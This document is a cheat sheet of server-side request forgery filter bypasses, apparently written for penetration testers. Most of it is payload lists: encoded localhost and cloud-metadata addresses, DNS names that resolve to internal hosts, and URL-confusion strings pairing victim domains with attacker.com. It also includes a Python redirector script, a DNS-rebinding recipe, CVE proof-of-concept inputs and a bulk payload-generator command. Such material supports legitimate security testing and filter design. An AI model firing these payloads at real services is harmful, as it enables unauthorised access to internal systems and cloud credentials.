# SSRF URL Format Bypass - Complete Guide

## Table of Contents
- [[#Localhost Payloads]]
- [[#Domain Parser Bypasses]]
- [[#Domain Confusion]]
- [[#Paths and Extensions Bypass]]
- [[#Bypass via Redirect]]
- [[#DNS Rebinding Bypass]]
- [[#Explained Tricks]]
- [[#Recent Library Parsing CVEs]]
- [[#Tools]]

---

## Localhost Payloads

### Basic Localhost
![](../../05-Assets/Pasted%20image%2020260701085453.png)
```
0                           # Just 0 is localhost in Linux
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http:@0/                    # → http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/             # SMTP
http://[::]:3128/           # Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪
```

### CIDR Bypass

```
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Dot Bypass

```
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821
```

### Decimal Bypass

```
http://2130706433/              # = http://127.0.0.1
http://3232235521/              # = http://192.168.0.1
http://3232235777/              # = http://192.168.1.1
```

### Octal Bypass

```
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001
```

### Hexadecimal Bypass

```
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/               # = http://127.0.0.1
http://0xc0a80014/               # = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001
```

### Mixed Encodings Bypass

```
169.254.43518                    # Partial Decimal (Class B) format
0xA9.254.0251.0376               # Hexadecimal, decimal and octal mixed
```

### Add 0s Bypass

```
127.000000000000.1
```

### Malformed and Rare

```
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1
```

### DNS to Localhost

```
localtest.me                                                    # = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io           # = 127.0.0.1
mail.ebc.apple.com                                              # = 127.0.0.6 (localhost)
127.0.0.1.nip.io                                               # = 127.0.0.1
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us  # = www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network                                   # = 127.0.0.2 (localhost)
1ynrnhl.xip.io                                                 # == 169.254.169.254
spoofed.burpcollaborator.net                                   # = 127.0.0.1
```

> **Tip:** Use the Burp extension **Burp-Encode-IP** for automated IP formatting bypasses.

---

## Domain Parser Bypasses

### Basic Techniques

```
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
```

### Circled Characters

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### Double Encoded Fragment

```
# To bypass split("#"): 
attacker.com%2523@victim
```

> **Tip:** Use the IP converter tool: https://www.silisoftware.com/tools/ipconverter.php

---

## Domain Confusion

### General Techniques

```
# Try also to change {domain} for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters

https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
```

### Colon + Backslash Confusion (CVE-2025-0454 in AutoGPT)

```
http://localhost:\@google.com/../
```

### IP Manipulation

```
# On each IP position try to put attacker domain and others victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
```

### Parameter Pollution

```
next={domain}&next=attacker.com
```

---

## Paths and Extensions Bypass

If you are required that the URL must end in a path or an extension, or must contain a path:

```
https://metadata/vulnerable/path#/expected/path
https://metadata/vulnerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```

---

## Bypass via Redirect

It might be possible that the server is filtering the original request of a SSRF but not a possible redirect response to that request.

**Example:** A server vulnerable to SSRF via `url=https://www.google.com/` might be filtering the `url` param. But if you use a Python server to respond with a 302 to the place where you want to redirect, you might be able to access filtered IP addresses like `127.0.0.1` or even filtered protocols like `gopher`.

### Simple Redirector for SSRF Testing

```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

**Usage:**

```bash
python3 redirector.py 8000 http://127.0.0.1/
# Then use: http://attacker.com:8000/
```

---

## DNS Rebinding Bypass (2025+)

Even when an SSRF filter performs a single DNS resolution before sending the HTTP request, you can still reach internal hosts by rebinding the domain between lookup and connection:

1. Point `victim.example.com` to a public IP so it passes the allow-list / CIDR check.
2. Serve a very low TTL (or use an authoritative server you control) and rebind the domain to `127.0.0.1` or `169.254.169.254` just before the real request is made.
3. Use tools like **Singularity** to automate the authoritative DNS + HTTP server.

### Singularity Tool

```bash
python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080
```

**Repository:** https://github.com/nccgroup/singularity

> **Note:** This technique was used in 2025 to bypass the BentoML "safe URL" patch and similar single-resolve SSRF filters.

---

## Explained Tricks

### Backslash Trick

The backslash-trick exploits a difference between the **WHATWG URL Standard** and **RFC3986**. While RFC3986 is a general framework for URIs, WHATWG is specific to web URLs and is adopted by modern browsers. The key distinction lies in the WHATWG standard's recognition of the backslash (`\`) as equivalent to the forward slash (`/`), impacting how URLs are parsed.

### Left Square Bracket

The "left square bracket" character `[` in the userinfo segment can cause Spring's `UriComponentsBuilder` to return a hostname value that differs from browsers:

```
https://example.com[@attacker.com
```

### IPv6 Zone Identifier (%25) Trick

Modern URL parsers that support **RFC 6874** allow link-local IPv6 addresses to include a zone identifier after a percent sign. Some security filters are not aware of this syntax and will only strip square-bracketed IPv6 literals:

```
http://[fe80::1%25eth0]/              # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/     # Another example (macOS style)
```

> **Important:** Always normalise the address before any security decision or strip the optional zone id entirely.

---

## Recent Library Parsing CVEs

|Year|CVE|Component|Bug Synopsis|PoC|
|---|---|---|---|---|
|2025|CVE-2025-0454|Python requests + urllib.parse (autogpt)|Parsing mismatch on `http://localhost:\\@google.com/../` lets allow-lists think host is google.com while request hits localhost|`requests.get("http://localhost:\\@google.com/../")`|
|2025|CVE-2025-2691|Node package nossrf|Library meant to block SSRF only checks original hostname, not resolved IP|`curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1`|
|2024|CVE-2024-29415|Node ip package|`isPublic()` misclassified dotted-octal / short-form localhost|`ip.isPublic('0127.0.0.1')` returns true on vulnerable|
|2024|CVE-2024-3095|Langchain WebResearchRetriever|No host filtering; GET requests could reach IMDS/localhost|User-controlled URL inside WebResearchRetriever|
|2024|CVE-2024-22243 / -22262|Spring UriComponentsBuilder|`[` in userinfo parsed differently by Spring vs browsers|`https://example.com\[@internal`|
|2023|CVE-2023-27592|urllib3 <1.26.15|Backslash confusion allowed `http://example.com\\@169.254.169.254/` to bypass filters|—|
|2022|CVE-2022-3602|OpenSSL|Hostname verification skipped when name is suffixed with `.`|—|

---

## Tools

### SSRF-PayloadMaker (2024+)

Creating large custom word-lists by hand is cumbersome. The open-source tool **SSRF-PayloadMaker** (Python 3) can generate 80k+ host-mangling combinations automatically, including mixed encodings, forced-HTTP downgrade and backslash variants:

```bash
# Generate every known bypass that transforms allowed host to attacker
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```

The resulting list can be fed directly into Burp Intruder or ffuf.

### URL Validation Bypass Cheat Sheet

PortSwigger provides an interactive web app where you can input the allowed host and attacker host to generate custom bypass URLs:

**https://portswigger.net/research/server-side-request-forgery**

---

## Quick Reference

### Most Common Bypasses to Try First

1. **Localhost Variants:** `127.0.0.1`, `127.1`, `0`, `[::1]`
2. **Decimal:** `2130706433` (for 127.0.0.1)
3. **Hex:** `0x7f000001` (for 127.0.0.1)
4. **Domain Confusion:** `@`, `#`, `%00`, backslash tricks
5. **DNS:** `localtest.me`, `*.nip.io`, rebinding
6. **Redirect:** Setup redirect server to bypass filters

### Wordlist Generation

- Use **SSRF-PayloadMaker** for comprehensive payloads
- Use **PortSwigger cheat sheet** for interactive generation
- Combine with **Burp Intruder** or **ffuf** for fuzzing


